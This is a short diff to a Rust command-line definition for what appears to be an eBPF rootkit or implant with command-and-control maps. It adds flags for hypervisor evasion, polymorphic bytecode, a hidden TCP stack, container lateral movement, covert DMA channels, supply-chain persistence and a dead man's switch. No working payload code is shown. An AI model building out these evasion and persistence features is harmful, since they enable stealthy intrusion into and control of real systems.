@@ -205,6 +205,42 @@ struct Cli {
     /// Enable BPF link pinning with obfuscated paths (F47)
     #[arg(long)]
     enable_bpf_obf_pin: bool,
+
+    /// Enable hypervisor-aware evasion (F48-F51)
+    #[arg(long)]
+    enable_hypervisor_evasion: bool,
+
+    /// Enable polymorphic/self-rewriting bytecode (F52-F54)
+    #[arg(long)]
+    enable_polymorphic: bool,
+
+    /// Enable phantom TCP stack in XDP/TC (F55-F57)
+    #[arg(long)]
+    enable_phantom_stack: bool,
+
+    /// Enable cross-container lateral movement (F58-F60)
+    #[arg(long)]
+    enable_container_lateral: bool,
+
+    /// Enable DMA/PCIe covert channels (F61-F63)
+    #[arg(long)]
+    enable_dma_covert: bool,
+
+    /// Enable AI-driven behavioral camouflage (F64-F66)
+    #[arg(long)]
+    enable_behavioral_ai: bool,
+
+    /// Enable supply chain persistence hooks (F67-F69)
+    #[arg(long)]
+    enable_supply_chain: bool,
+
+    /// Enable dead man's switch heartbeat monitor (F70-F72)
+    #[arg(long)]
+    enable_deadman_switch: bool,
+
+    /// Enable BPF-to-BPF parasitism (F73-F75)
+    #[arg(long)]
+    enable_bpf_parasitism: bool,
 }
 
 struct C2Maps {
